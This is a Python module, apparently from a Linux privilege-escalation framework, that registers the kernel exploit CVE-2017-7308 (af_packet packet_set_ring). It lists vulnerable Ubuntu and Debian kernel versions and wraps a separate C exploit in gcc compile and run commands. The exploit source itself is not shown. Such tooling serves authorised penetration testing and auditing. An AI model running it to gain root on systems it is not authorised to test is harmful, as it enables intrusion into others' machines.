import os
from exploits.exploit import LinuxExploit
from src.kernels import KernelWindow
from constants import *


class CVE20177308(LinuxExploit):
	def __init__(self):
		LinuxExploit.__init__(self)
		self.name = "CVE20177308"
		self.formatted_name = "CVE-2017-7308"
		self.e_type = "linux"
		self.brief_desc = "`packet_set_ring` in net/packet/af_packet.c can gain privileges via crafted system calls."
		self.reliability = HIGH_RELIABILITY
		self.vulnerable_base = KernelWindow(GENERIC_LINUX, BASE_VULNERABLE, 0, 0, 0, 4, 10, 6)
		self.vulnerable_kernels = [
			KernelWindow(UBUNTU_16, BASE_VULNERABLE, 0, 0, 0, 4, 8, 0, highest_patch_level="4.8.0-46.49"),
			KernelWindow(UBUNTU_16, BASE_VULNERABLE, 0, 0, 0, 4, 4, 0, highest_patch_level="4.4.0-72.93"),
			KernelWindow(UBUNTU_14, BASE_VULNERABLE, 0, 0, 0, 3, 13, 0, highest_patch_level="3.13.0.116.126"),
			KernelWindow(UBUNTU_12, BASE_VULNERABLE, 0, 0, 0, 3, 2, 0, highest_patch_level="3.2.0.126.141"),
			KernelWindow(UBUNTU_GENERIC, BASE_VULNERABLE, 0, 0, 0, 3, 2, 0),
			KernelWindow(DEBIAN_9, BASE_VULNERABLE, 0, 0, 0, 4, 9, 18, highest_patch_level="4.9.18-1"),
			KernelWindow(DEBIAN_8, BASE_VULNERABLE, 0, 0, 0, 3, 16, 43, highest_patch_level="3.16.43-1"),
			KernelWindow(DEBIAN_7, BASE_VULNERABLE, 0, 0, 0, 3, 2, 88, highest_patch_level="3.2.88-1"),
			KernelWindow(DEBIAN_GENERIC, BASE_VULNERABLE, 0, 0, 0, 3, 2, 88),
		]
		self.exploit_kernels = [
			KernelWindow(UBUNTU_16, EXPLOIT_AVAILABLE, 0, 0, 0, KERNEL_MAJOR_VERSION_CAP+1, 0, 0)
		]
		self.source_c_path = os.path.join(LINUX_EXPLOIT_SOURCE_PATH, "{}.c".format(self.name))
		self.compilation_path = os.path.join(PLAYGROUND_PATH, self.name)
		self.compilation_command = "gcc -o {} {}".format(self.compilation_path, self.source_c_path)
		self.exploit_command = self.compilation_path

	def determine_vulnerability(self):
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name), color="blue")
		# if kernel matches...it should be vulnerable
		color_print("\t[+] system appears to be vulnerable to {}".format(self.name), color="green")
		return True